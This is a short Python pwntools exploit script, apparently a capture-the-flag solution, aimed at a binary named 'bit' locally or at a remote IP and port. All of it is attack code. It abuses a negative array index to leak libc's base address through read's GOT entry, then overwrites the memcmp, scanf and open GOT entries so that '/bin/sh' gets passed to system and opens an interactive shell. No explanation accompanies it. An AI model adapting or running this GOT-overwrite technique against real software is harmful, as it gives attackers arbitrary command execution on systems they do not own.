#!/usr/bin/env python
from pwn import *

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./bit')
        system_offset = 0x3a940
        read_offset = 0xd4350
        isascii_offset = 0x25010
    else:
        s = remote('128.199.135.210',31335)
        system_offset = 0x3b020
        read_offset = 0xd82a0
        isascii_offset = 0x24f80

    main_addr = 0x8048953
    login_addr = 0x80485d6
    start = -42
    read_got = -21
    memcmp_got = -19
    open_got = -16
    scanf_got = -13
    match_val = 0x804836c

    s.send("hoge")
    s.sendline("-65536")
    n = 0x7e
    s.sendline(str(n))
    for i in range(n):
        s.sendline('0')
    s.sendline('-1')
    s.sendline(str(match_val))
    for i in range(-start):
        if i == read_got - start:
            s.sendline('n')
            s.recvuntil('ARRAY[%d] = ' % read_got)
            libc_base = int(s.recvline()) - read_offset
            print '[*] libc base is', hex(libc_base)
        elif i == memcmp_got - start:
            s.sendline('y')
            s.sendline(str(libc_base + system_offset))
        elif i == scanf_got - start:
            s.sendline('y')
            s.sendline(str(login_addr))
        elif i == open_got - start:
            s.sendline('y')
            s.sendline(str(libc_base + isascii_offset))
        else:
            s.sendline('n')
    s.sendline('y')
    s.sendline('/bin/sh\x00')
    s.sendline('/bin/sh\x00')
    s.recvuntil('Enter your password:\n')
    s.interactive()
